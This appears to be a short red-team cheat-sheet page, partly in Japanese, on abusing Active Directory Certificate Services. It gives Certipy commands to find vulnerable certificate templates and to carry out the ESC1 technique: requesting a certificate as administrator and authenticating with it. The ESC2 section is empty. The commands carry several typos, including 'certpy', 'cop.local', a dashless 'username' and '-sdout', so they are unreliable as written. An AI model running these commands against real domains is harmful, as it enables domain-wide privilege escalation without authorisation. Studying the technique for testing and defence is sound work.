---
title: ECS
parent: Active Directory
grand_parent: Red Team
---
# Vulnerability Check

```zsh
certpy find -u 'john.doe@corp.local' -p 'Password123!' -dc-ip 10.10.10.1 -vulnerable -enable -sdout
```

結果出力からTemplate Nameの名前をチェック（IT_Departmentなど）

---

# ECS1

```zsh
certpy req -u 'john.doe@corp.local' -p 'Password123!' -dc-ip 10.10.10.1 -ca corp-DC-CA -template IT_Department -upn administrator@cop.local -sid 'S-1-5-21-2653575769-1792018612-379198915-500'
```

```zsh
certipy auth -pfx administrator.pfx username administrator -domain corp.local -dc-ip 10.10.10.1
```

---

# ECS2

